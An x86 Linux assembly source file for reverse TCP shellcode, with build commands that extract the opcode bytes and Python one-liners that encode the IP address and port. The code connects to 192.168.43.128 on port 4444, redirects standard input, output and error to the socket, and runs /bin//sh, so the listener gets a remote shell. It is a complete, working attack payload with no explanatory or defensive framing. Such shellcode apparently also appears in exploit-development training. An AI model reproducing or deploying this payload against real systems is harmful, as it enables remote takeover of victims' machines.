; Compile:
; nasm -f elf32 x86-reverse-tcp.asm -o x86-reverse-tcp.o; for i in $(objdump -D x86-reverse-tcp.o|grep "^ "|cut -f2);do echo -n $i; done; echo
; IP address (e.g., mov ecx, 0x802ba8c0):
; python -c 'from sys import argv;a=argv[1].split(".");a.reverse();a="".join([hex(int(oct)).lstrip("0x") for oct in a]);print(f"0x{a}")' "192.168.43.128"
; TCP port 4444 (e.g., 0x5c11)
; python -c 'from sys import argv;from struct import pack;from binascii import hexlify;print("0x"+hexlify(pack("<H",int(argv[1]))).decode())' 4444

global _start
section .text

_start:

socket:
    xor ecx, ecx
    mov ebx, ecx
    mul ebx
    inc cl
    inc bl
    inc bl
    mov ax, 0x167
    int 0x80

connect:
    xchg ebx, eax
    dec cl
    push ecx
    mov dl, 0x16
    ; TODO: IP address 192.168.43.128 (0x802ba8c0)
    mov ecx, 0x802ba8c0
    push ecx
    ; TODO: TCP port 4444 (0x5c11)
    push word 0x5c11
    push word 0x02
    lea ecx, [esp]
    mov ax, 0x16a
    int 0x80

dup:
    xor ecx, ecx
    mov cl, 0x3

dup2:
    xor eax, eax
    mov al, 0x3f
    dec cl
    int 0x80
    jnz dup2

execve:
    cdq
    mul edx
    lea ecx, [eax]
    mov esi, 0x68732f2f
    mov edi, 0x6e69622f
    push ecx
    push esi
    push edi
    lea ebx, [esp]
    mov al, 0xb
    int 0x80
